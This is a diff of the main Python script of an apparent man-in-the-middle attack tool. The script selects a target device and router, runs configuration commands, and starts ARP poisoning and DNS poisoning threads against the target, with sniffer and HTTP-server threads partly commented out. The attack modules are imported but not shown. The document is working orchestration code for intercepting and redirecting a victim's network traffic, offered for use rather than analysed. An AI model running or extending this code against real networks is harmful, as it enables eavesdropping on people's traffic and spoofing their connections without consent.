@@ -1,4 +1,6 @@
+#!/usr/bin/env python3
 import argparse
+import os
 import sys
 import time
 
@@ -7,53 +9,91 @@ from queue import Queue
 from arp_poisoning import start_arp_poisoning
 from http_server import start_http_server_thread
 from packet_analysis import start_sniffer_thread
-
+from dns_poisoning import start_dns_poisoning
 
 from colorama import init, Fore
 
-from utils import thread_with_trace
+from input_data import get_target_to_attack, get_router_ip
+from utils import thread_with_trace, run_configuration_commands, run_restoring_commands
 
 init()
 GREEN = Fore.GREEN
-RED   = Fore.RED
+RED = Fore.RED
 RESET = Fore.RESET
+
 
 def printer(queue):
     print(f"{GREEN}[+] Printing thread started{RESET}")
     while True:
         message = queue.get()
         if message[:3] == "[*]":
-            print(message +'\n#>')
+            print(message + '\n#>')
         else:
             print(message)
 
-def initialize_program(interface_pc, mac_address, verbosity, local_printing_queue):
-    original_thread_list = []
-    original_printer_thread = thread_with_trace(target=printer, args=(local_printing_queue,), daemon=True,name="Printer")
+
+def initialize_program(interface_pc, mac_address, ip_address, router_ip, verbosity, local_printing_queue):
+
+    original_tokens_list = []
+
+    if router_ip is None:
+        router_ip = get_router_ip()
+
+
+    run_configuration_commands(router_ip)
+
+    # getting targeted device
+    if ip_address is not None:
+        targeted_ip = ip_address
+    else:
+        targeted_device = get_target_to_attack(mac_address, ip_address)
+        targeted_ip = targeted_device['ip']
+
+    
+    # starting thread for printing everything
+    original_printer_thread = thread_with_trace(target=printer, args=(local_printing_queue,), daemon=True,
+                                                name="Printer")
     original_printer_thread.start()
 
-    sniffer_thread = start_sniffer_thread(interface_pc,local_printing_queue, verbosity)
-    http_server_thread = start_http_server_thread(local_printing_queue,verbosity)
-    start_arp_poisoning(mac_address)
+    # starting core threads
 
-    original_thread_list.append(http_server_thread)
-    original_thread_list.append(sniffer_thread)
+    arp_poisoning_token = start_arp_poisoning(interface_pc, targeted_ip, router_ip, local_printing_queue, verbosity)
 
-    return original_thread_list,original_printer_thread
 
+    # sniffer_thread_token = start_sniffer_thread(interface_pc, targeted_ip, router_ip, local_printing_queue,verbosity)
+
+    dns_poisoning_token = start_dns_poisoning(interface_pc,targeted_ip, router_ip, local_printing_queue, verbosity)
+
+
+    # http_server_thread = start_http_server_thread(interface_pc,local_printing_queue, verbosity)
+    # creating list with cancellation tokens
+    # original_tokens_list.append(sniffer_thread_token)
+    # original_thread_list.append(http_server_thread)
+    original_tokens_list.append(arp_poisoning_token)
+
+    original_tokens_list.append(dns_poisoning_token)
+
+    return original_tokens_list, original_printer_thread
 
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
     parser.add_argument('-i', '--interface', default="wlan0")
     parser.add_argument('-m', '--mac_address')
-    #parser.add_argument('-a', "--address")
+    parser.add_argument('-t', "--target_ip")
+    parser.add_argument('-r', '--router_ip')
     parser.add_argument('-v', '--verbosity', default=0)
+    # parser.add_argument('-n', '--no-http')
     args = parser.parse_args()
+
+    if os.getuid() != 0:
+        print("[-] Run again with sudo privileges")
+        exit(1)
 
     printing_queue = Queue()
 
-    thread_list, printer_thread = initialize_program(args.interface, args.mac_address, args.verbosity, printing_queue)
+    tokens_list, printer_thread = initialize_program(args.interface, args.mac_address, args.target_ip, args.router_ip , args.verbosity,
+                                                     printing_queue)
     time.sleep(1)
     while True:
         command = input("#>")
@@ -61,14 +101,12 @@ if __name__ == "__main__":
             case "help":
                 print("TBD")
             case "stop":
-                for thread in thread_list:
-                    thread.kill()
-                    thread.join()
-
+                for token in tokens_list:
+                    token.set()
             case "exit":
-                for thread in thread_list:
-                    thread.kill()
-                    thread.join()
+                for token in tokens_list:
+                    token.set()
+                run_restoring_commands()
                 printer_thread.kill()
                 printer_thread.join()
                 print("Everything stopped")
